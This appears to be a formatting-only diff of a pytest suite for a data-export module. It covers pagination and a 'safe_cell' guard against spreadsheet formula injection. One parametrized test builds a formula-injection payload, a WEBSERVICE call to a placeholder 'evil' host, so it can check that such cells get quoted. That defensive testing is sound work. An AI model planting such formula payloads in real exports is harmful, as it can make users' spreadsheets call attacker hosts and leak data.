@@ -10,18 +10,18 @@ Covers the five public surfaces documented in the EPIC:
 * ``paginate`` — async generator, hard-cap refusal rather than silent
   truncation
 """
+
 from __future__ import annotations
 
 import asyncio
 from datetime import date, datetime, timezone
 
 import pytest
-
 from shared.fda_export import (
-    ExportWindowError,
     MAX_EXPORT_WINDOW_DAYS,
     PII_PERMISSION,
     PII_REDACTION_PLACEHOLDER,
+    ExportWindowError,
     hash_pii_value,
     paginate,
     redact_pii_row,
@@ -33,7 +33,6 @@ from shared.fda_export import (
     validate_export_window,
 )
 from shared.fda_export.pii import redact_pii_extras
-
 
 # ---------------------------------------------------------------------------
 # safe_cell
@@ -51,7 +50,7 @@ class TestSafeCell:
 
     @pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
     def test_dangerous_prefixes_get_quoted(self, prefix: str) -> None:
-        value = prefix + "WEBSERVICE(\"http://evil/\")"
+        value = prefix + 'WEBSERVICE("http://evil/")'
         result = safe_cell(value)
         assert result.startswith("'")
         # Original value must still be recoverable after stripping the
@@ -274,11 +273,13 @@ class TestPaginate:
     def _collect(self, agen):
         async def runner():
             return [batch async for batch in agen]
+
         return asyncio.run(runner())
 
     def test_single_page(self) -> None:
         async def fetcher(*, cursor, limit):
             return ([1, 2, 3], None)
+
         batches = self._collect(paginate(fetcher, batch_size=10))
         assert batches == [[1, 2, 3]]
 
@@ -301,6 +302,7 @@ class TestPaginate:
     def test_empty_first_page_terminates(self) -> None:
         async def fetcher(*, cursor, limit):
             return ([], None)
+
         batches = self._collect(paginate(fetcher, batch_size=10))
         assert batches == []
 
